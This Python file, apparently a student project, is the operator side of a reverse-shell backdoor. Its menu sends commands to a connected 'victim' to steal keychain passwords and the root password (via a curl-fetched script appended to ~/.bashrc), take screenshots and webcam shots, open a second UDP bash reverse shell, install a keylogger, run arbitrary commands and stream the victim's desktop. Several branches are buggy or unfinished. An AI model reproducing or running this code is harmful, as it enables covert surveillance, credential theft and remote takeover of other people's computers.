# anshul hadaye TYIT PROJECT
 
import socket
import os
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8080

BUFFER_SIZE = 1024

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
while True:
    print("1. Get terminal login")
    print("2. Get passwords from internet")
    print("3. Get login/password of root account")
    print("4. Open browser")
    print("5. Take screenshots")
    print("6. Take webcam shot")
    print("7. Open second backdoor")
    print("8. Activate KeyLogger ")
    print("9. Record microphone")
    print("10. Exit the reverse shell")
    print("11. Costum Command")
    print("12. See victims desktop live")
    print("13. Block Web Traffic ")
    print("14. Encrypt all files (zip -er ) ")

    a = int(input("Your choice: "))
    if a == 1:
        os.system("clear")
        command = "whoami"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 2:
        os.system("clear")
        b = input("Enter site URL: ")
        #command = f"security find-internet-password -gs {b}"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 3:
        os.system("clear")
        #command = "curl 'https://git.io/fhNWm' >> ~/.bashrc"
        print("Just wait, when the user enters the password, you will find it in the tmp folder")
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 4:
        os.system("clear")
        url = input("What URL do you want to open? ")
        command = f"xdg-open {url}"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 5:
        os.system("clear")
        command = "whoami"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)
        name = input("Enter user: ")
        command = f"import -window {name} -resize 1920x1080 -delay 200 screenshot.png"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)
        dest = input("Enter directory: ")
        usrm = input("Enter your username: ")
        command = f"scp -3 {name}@127.0.0.1:/image.jpeg {usrm}@{SERVER_HOST}:{dest}"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 6:
        os.system("clear")
        command = "streamer -f jpeg -o image.jpeg"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 7:
        os.system("clear")
        command = f"watch -n1 40 setsid sh -i >& /dev/udp/{SERVER_HOST}/{SERVER_PORT} 0>&1"
        print("UDP BASH reverse shell opened, use nc -u -lvp *port* to listen for connection")
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 8:
        os.system("clear")
        command = "pip2 install keylogger"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)
        command = "keylogger"
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)
        client_socket.send(command.encode())
        command = "keylogger --log-file /users/log.txt"
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 9:
        os.system("clear")
        print("Soon")

    elif a == 10:
        break

    elif a == 11:
        os.system("clear")
        command = input("Enter the command you want to execute:")
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif a == 12:
        os.system("clear")
        print("Preparing")
        os.system("apt-get update && apt-get install ffmpeg")
        os.system("ffmpeg -i udp://0.0.0.0:10001 /tmp/outputFile.avi")
        command = "unzip /tmp/ffmpeg.zip"
        client_socket.send(command.encode())
        command = "cd ffmpeg-4.0-macos64-static/bin/"
        client_socket.send(command.encode())
        command = "chmod 777 ffmpeg"
        client_socket.send(command.encode())
        command = "./ffmpeg -f avfoundation -list_devices true -i \"\""
        client_socket.send(command.encode())
        l = '"1"'
        command = f"./ffmpeg -f avfoundation -i {l} -f avi udp://{SERVER_HOST}:{SERVER_PORT}"
        client_socket.send(command.encode())
    elif a==13:
        print("website block script")
    elif a==14:
        print("File Encrypt script")
    else:
        print("Option not available")
